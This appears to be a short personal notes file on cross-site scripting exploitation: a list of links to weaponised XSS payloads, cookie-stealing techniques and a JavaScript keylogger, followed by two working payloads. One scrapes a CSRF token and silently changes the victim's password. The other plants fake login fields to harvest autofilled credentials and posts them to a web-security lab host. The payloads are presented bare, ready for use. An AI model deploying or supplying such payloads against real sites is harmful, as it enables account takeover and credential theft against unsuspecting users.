https://excess-xss.com/
https://labs.detectify.com/2012/11/07/how-to-exploit-an-xss/
https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4
https://github.com/hakluke/weaponised-XSS-payloads
https://www.exploit-db.com/exploits/20009
http://www.xssed.com/xssinfo
https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page
https://github.com/JohnHoder/Javascript-Keylogger

##
https://gist.github.com/The-XSS-Rat?direction=asc&sort=updated
##

##
https://trustedsec.com/blog/chaining-vulnerabilities-to-exploit-post-based-reflected-xss
##


```
<script>
var x = new XMLHttpRequest();
x.open("GET", "/lk", true);
x.onreadystatechange = function() {
    if (x.readyState == XMLHttpRequest.DONE) {
        text = x.responseText;
        text = text.substr(text.indexOf('invisible">') + 'invisible">'.length);
        csrf = text.substr(0, text.indexOf('</p>'));
        newdata = JSON.stringify({'new_password':'QWERTYqwerty1',confirm_password:'QWERTYqwerty1','token':csrf});
        y = new XMLHttpRequest();
        y.open("POST", "/change_password", true);
        y.setRequestHeader("Content-type", "application/json");
        y.send(newdata);
    }
};
x.send(null);
</script>
```

```
<form><input type="text" id="username" name="username"></form>
<form><input type="password" id="password" name="password"></form>
<script>
window.onload = function(e) {
    setTimeout(function() {
        var csrf = document.getElementsByName("csrf")[0].value;
        var username = document.getElementById("username").value;
        var passw = document.getElementById("password").value;
        console.log(csrf);
        fetch('https://ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net/post/comment', {
            method: 'POST',
            body: 'csrf=' + csrf + '&postId=3&comment=Username: ' + username + ', Password: ' + passw + '&name=Jan&email=admin%40cmdnctrl.net&website='
        });
    }, 2500);
};
</script>
```
